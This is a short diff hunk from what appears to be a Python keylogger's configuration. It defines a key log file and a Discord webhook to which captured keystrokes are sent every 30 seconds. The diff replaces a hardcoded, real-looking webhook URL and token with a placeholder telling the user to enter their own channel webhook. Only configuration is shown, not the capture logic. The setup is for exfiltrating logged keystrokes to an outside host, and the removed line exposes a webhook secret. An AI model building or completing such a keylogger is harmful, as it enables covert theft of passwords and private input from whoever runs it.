@@ -15,7 +15,7 @@ if platform.system() == "Windows":
 
 # Configuration
 LOG_FILE = "key_log.txt"
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1248392956709437541/PRnRnhWu38IMbs5Rv_T5IA7YEYyUuBE_MQf_ivdroxaRR6w6Dh7mMutq5AWXMgu5OnRE"
+DISCORD_WEBHOOK_URL = "ENTER YOUR DISCORD CHANNEL WEBHOOK HERE"
 SEND_INTERVAL = 30  # Time interval to send to Discord
 BUFFER_FLUSH_INTERVAL = 20  # Time interval to save resources
 MAX_DISCORD_MESSAGE_LENGTH = 2000  # Discord's message size limit (Do not change)
